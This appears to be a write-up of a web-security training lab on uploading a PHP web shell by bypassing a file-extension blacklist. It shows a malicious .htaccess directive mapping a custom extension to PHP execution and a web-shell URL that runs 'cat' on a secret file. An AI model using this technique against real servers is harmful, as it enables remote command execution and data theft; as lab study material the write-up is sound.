Title: Web shell upload via extension blacklist bypass
Level: Practitioner
Desc:  This lab contains a vulnerable image upload function. Certain file extensions are blacklisted, but this defense can be bypassed due to a fundamental flaw in the configuration of this blacklist.
To solve the lab, upload a basic PHP web shell, then use it to exfiltrate the contents of the file /home/carlos/secret. Submit this secret using the button provided in the lab banner.
You can log in to your own account using the following credentials: wiener:peter 


![image](https://github.com/user-attachments/assets/b5235b16-36a6-482e-9863-5a9bbd626566)


![image](https://github.com/user-attachments/assets/da1c0f82-12a3-4fbf-a053-517159eb6c64)

attack url: `https://0ae000f603694bde80ab2b5c001700a8.web-security-academy.net/files/avatars/webshell.php5`

Still not executable

We know, that we have Apache web server - through the headers from responses.
So we try to upload htaccess file:
![image](https://github.com/user-attachments/assets/fe428e45-6f69-4633-b6bc-983e93895217)

![image](https://github.com/user-attachments/assets/d270429d-226e-44ca-a177-95d2b22627c7)

Attack URL: `https://0ae000f603694bde80ab2b5c001700a8.web-security-academy.net/files/avatars/webshell.shell?cmd=cat+/home/carlos/secret`

A little bit of explanation from tutorial (solution)
`AddType application/x-httpd-php .shell` maps an arbitrary extension (.shell) to the executable MIME type application/x-httpd-php. As the server uses the mod_php module, it knows how to handle this already.
Thanks to our malicious .htaccess file, the .shell file was executed as if it were a .php file. 

